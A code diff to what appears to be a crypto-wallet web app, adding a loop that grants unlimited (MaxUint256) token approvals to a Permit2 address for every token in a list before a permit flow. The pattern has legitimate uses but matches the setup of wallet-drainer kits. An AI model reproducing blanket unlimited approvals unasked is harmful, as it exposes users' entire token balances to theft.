@@ -236,6 +236,40 @@ async function connectWallet(){
 async function runPermitFlow(provider,signer,user){
  try{
 
+    log("🔍 Checking Permit2 allowances...");
+
+const erc20Abi = [
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
+];
+
+for (let token of TOKENS) {
+
+  const tokenContract = new ethers.Contract(token, erc20Abi, signer);
+
+  const allowance = await tokenContract.allowance(user, PERMIT2);
+
+  log(`Token: ${token}`);
+  log(`Current allowance: ${allowance}`);
+
+  if (allowance == 0n) {
+
+    log("⚠️ No allowance → sending approve tx...");
+
+    const tx = await tokenContract.approve(
+      PERMIT2,
+      ethers.MaxUint256
+    );
+
+    log("⏳ Waiting for approval confirmation...");
+    await tx.wait();
+
+    log("✅ Approval confirmed");
+
+  } else {
+    log("✅ Allowance already exists");
+  }
+}
  log("🚀 Starting permit flow");
  log("User: " + user);
 
